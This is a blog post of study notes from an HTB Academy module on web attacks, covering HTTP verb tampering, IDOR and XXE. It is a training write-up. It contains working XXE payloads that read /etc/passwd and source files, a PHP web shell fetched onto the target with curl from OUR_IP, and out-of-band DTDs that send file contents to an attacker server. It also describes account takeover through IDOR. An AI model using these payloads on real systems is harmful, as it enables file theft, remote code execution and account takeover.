---
title: "Web attacks"
date: 2026-02-24 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "HTTP verb tampering, Insecure Direct Object References (IDOR), API parameter tampering, and logic flaw exploitation."
image:
  path: /assets/img/posts/web_attacks.jpg
  alt: Web attacks
---

# **HTTP Verb Tampering**

To understand `HTTP Verb Tampering`, we must first learn about the different methods accepted by the HTTP protocol. HTTP has [9 different verbs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) that can be accepted as HTTP methods by web servers. Other than `GET` and `POST`, the following are some of the commonly used HTTP verbs:

| **Verb** | **Description** |
| --- | --- |
| `HEAD` | Identical to a GET request, but its response only contains the `headers`, without the response body |
| `PUT` | Writes the request payload to the specified location |
| `DELETE` | Deletes the resource at the specified location |
| `OPTIONS` | Shows different options accepted by a web server, like accepted HTTP verbs |
| `PATCH` | Apply partial modifications to the resource at the specified location |

As you can imagine, some of the above methods can perform very sensitive functionalities, like writing (`PUT`) or deleting (`DELETE`) files to the webroot directory on the back-end server. As discussed in the [Web Requests](https://academy.hackthebox.com/course/preview/web-requests) module, if a web server is not securely configured to manage these methods, we can use them to gain control over the back-end server. However, what makes HTTP Verb Tampering attacks more common (and hence more critical), is that they are caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability.

## **Insecure Configurations**

Insecure web server configurations cause the first type of HTTP Verb Tampering vulnerabilities. A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. For example, a system admin may use the following configuration to require authentication on a particular web page:

Code: xml

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

## **Insecure Coding**

Insecure coding practices cause the other type of HTTP Verb Tampering vulnerabilities (though some may not consider this Verb Tampering). This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters:

Code: php

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

We can see that the sanitization filter is only being tested on the `GET` parameter. If the GET requests do not contain any bad characters, then the query would be executed. However, when the query is executed, the `$_REQUEST["code"]` parameters are being used, which may also contain `POST` parameters, `leading to an inconsistency in the use of HTTP Verbs`. In this case, an attacker may use a `POST` request to perform SQL injection, in which case the `GET` parameters would be empty (will not include any bad characters). The request would pass the security filter, which would make the function still vulnerable to SQL Injection.

While both of the above vulnerabilities are found in public, the second one is much more common

## Bypassing Basic Authentication

```bash
Fau5t@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/

HTTP/1.1 200 OK
Date:
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0
Content-Type: httpd/unix-directory
```

Simply http verb is you try to change header. if we can also use it to execute command injection with it. if for example text; does not work on GET we can try it on POST 

# **Identifying IDORs**

---

## **URL Parameters & APIs**

---

The very first step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (`?uid=2`) or (`?filename=file_2.pdf`). We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.

it can be encoded to various hashes or other things. you need to look out for them too.

## **Exploiting Insecure APIs**

We know that we can change the `full_name`, `email`, and `about` parameters, as these are the ones under our control in the HTML form in the `/profile` web page. So, let's try to manipulate the other parameters.

There are a few things we could try in this case:

1. Change our `uid` to another user's `uid`, such that we can take over their accounts
2. Change another user's details, which may allow us to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change our role to a more privileged role (e.g. `admin`) to be able to perform more actions

Let's start by changing our `uid` to another user's `uid` (e.g. `"uid": 2`). However, any number we set other than our own `uid` gets us a response of `uid mismatch`:

In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is `modifying a user's email address` and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. Another potential attack is `placing an XSS payload in the 'about' field`, which would get executed once the user visits their `Edit profile` page, enabling us to attack the user in different ways.

# XEE

If we send the form without any modification, we get the following message:

![HTTP POST request to /submitDetails.php with XML data including 'name', 'tel', 'email', and 'message' fields. Response: HTTP/1.1 200 OK, message 'Check your email email@xxe.htbl for further instructions.'](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_xxe_response.jpg)

We see that the value of the `email` element is being displayed back to us on the page. To print the content of an external file to the page, we should `note which elements are being displayed, such that we know which elements to inject into`. In some cases, no elements may be displayed, which we will cover how to exploit in the upcoming sections.

For now, we know that whatever value we place in the `<email></email>` element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the `email` element to see whether it gets replaced with the value we defined. To do so, we can use what we learned in the previous section for defining new XML entities and add the following lines after the first line in the XML input:

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

**Note:** In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.

Now, we should have a new XML entity called `company`, which we can reference with `&company;`. So, instead of using our email in the `email` element, let us try using `&company;`, and see whether it will be replaced with the value we defined (`Inlane Freight`):

![HTTP POST request to /submitDetails.php with XML data including 'name', 'tel', 'email', and 'message' fields. Response: HTTP/1.1 200 OK, message 'Check your email Inlane Freight for further instructions.'](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_xxe_new_entity.jpg)

As we can see, the response did use the value of the entity we defined (`Inlane Freight`) instead of displaying `&company;`, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (`&company;`) as a raw value. `This confirms that we are dealing with a web application vulnerable to XXE`.

## **Reading Sensitive Files**

Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the `SYSTEM` keyword and define the external reference path after it, as we have learned in the previous section:

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

## **Remote Code Execution with XXE**

In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

Local File Disclosure

```bash
Fau5t@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
Fau5t@htb[/htb]$ sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:

Code: xml

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

Once we send the request, we should receive a request on our machine for the `shell.php` file, after which we can interact with the web shell on the remote server for code execution.

**Note:** The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

## **Advanced Exfiltration with CDATA**

In the previous section, we saw how we could use PHP filters to encode PHP source files, such that they would not break the XML format when referenced, which (as we saw) prevented us from reading these files. But what about other types of Web Applications? We can utilize another method to extract any kind of data (including binary data) for any web application backend. To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

One easy way to tackle this issue would be to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

After that, if we reference the `&joined;` entity, it should contain our escaped data. However, `this will not work, since XML prevents joining internal and external entities`, so we will have to find a better way to do so.

To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:

Code: xml

```xml
<!ENTITY joined "%begin;%file;%end;">
```

So, let's try to read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), host it on our machine, and then reference it as an external entity on the target web application, as follows:

Advanced File Disclosure

```bash
Fau5t@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Fau5t@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## **Error Based XXE**

Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be `blind` to the XML output and so would not be able to retrieve the file content using our usual methods.

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.

Let's consider the exercise we have in

```
/error
```

at the end of this section, in which none of the XML input entities is displayed on the screen. Because of this, we have no entity that we can control to write the file output. First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g.

```
<roo>
```

instead of

```
<root>
```

), or just reference a non-existing entity, as follows:

![HTTP POST request to /error/submitDetails.php with XML data causing a 'nonExistingEntity' error in PHP response.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_xxe_cause_error.jpg)

We see that we did indeed cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:

Code: xml

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The above payload defines the `file` parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.

Now, we can call our external DTD script, and then reference the `error` entity, as follows:

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the `/etc/hosts` file as follows:

## **Out-of-band Data Exfiltration**

If we try to repeat any of the methods with the exercise we find at `/blind`, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as `Out-of-band (OOB) Data Exfiltration`, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE. Both the [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss) and the [Whitebox Pentesting 101: Command Injections](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) modules discussed similar attacks, and here we will utilize a similar attack, with slight modifications to fit our XXE vulnerability.

In our previous attacks, we utilized an `out-of-band` attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.

To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:

Code: xml

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:

**Tip:** In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.
